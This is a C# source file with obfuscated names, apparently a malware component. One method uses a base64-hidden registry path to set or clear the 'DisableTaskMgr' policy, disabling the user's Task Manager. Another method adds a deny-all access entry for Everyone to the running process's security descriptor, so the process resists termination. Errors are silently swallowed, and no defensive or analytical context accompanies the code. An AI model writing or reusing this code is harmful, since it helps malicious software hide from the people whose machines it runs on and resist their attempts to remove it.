using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;

namespace LSMgrTguKYchoUzfqQ;

internal class gRUpMCDqqukZH
{
	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr XnDcTHRQYDjYf, int uLSvxQkhciU, [Out] byte[] lpsFbUlbgyI, uint xwaurLKgZD, out uint ABBZWwAJBgYsaEX);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr vsyuktwOnWjvjgNm, int fASDXxcPNCaMC, [In] byte[] brTIxViMDPvK);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void GsfduObDmNi(bool YnGtMXcSkcvGG)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(VSCOSikLsIYu.AKDOdYwKlSeS("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVt"));
			if (YnGtMXcSkcvGG && registryKey.GetValue(VSCOSikLsIYu.AKDOdYwKlSeS("RGlzYWJsZVRhc2tNZ3I=")) != null)
			{
				registryKey.DeleteValue(VSCOSikLsIYu.AKDOdYwKlSeS("RGlzYWJsZVRhc2tNZ3I="));
			}
			else
			{
				registryKey.SetValue(VSCOSikLsIYu.AKDOdYwKlSeS("RGlzYWJsZVRhc2tNZ3I="), "1");
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor KLNrNcrEtsvsCr(IntPtr HnjPSrXPvVefJ)
	{
		byte[] lpsFbUlbgyI = new byte[0];
		GetKernelObjectSecurity(HnjPSrXPvVefJ, 4, lpsFbUlbgyI, 0u, out var ABBZWwAJBgYsaEX);
		if ((long)ABBZWwAJBgYsaEX > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(HnjPSrXPvVefJ, 4, lpsFbUlbgyI = new byte[ABBZWwAJBgYsaEX], ABBZWwAJBgYsaEX, out ABBZWwAJBgYsaEX))
		{
			return null;
		}
		return new RawSecurityDescriptor(lpsFbUlbgyI, 0);
	}

	private void xjODyKGWINwSx(IntPtr KcHpVOlRqTqjcL, RawSecurityDescriptor QLHrqKRMDzBXq)
	{
		byte[] array = new byte[QLHrqKRMDzBXq.BinaryLength];
		QLHrqKRMDzBXq.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(KcHpVOlRqTqjcL, 4, array);
	}

	public void HQebRZfXRECUsRHr()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = KLNrNcrEtsvsCr(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			xjODyKGWINwSx(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}
}
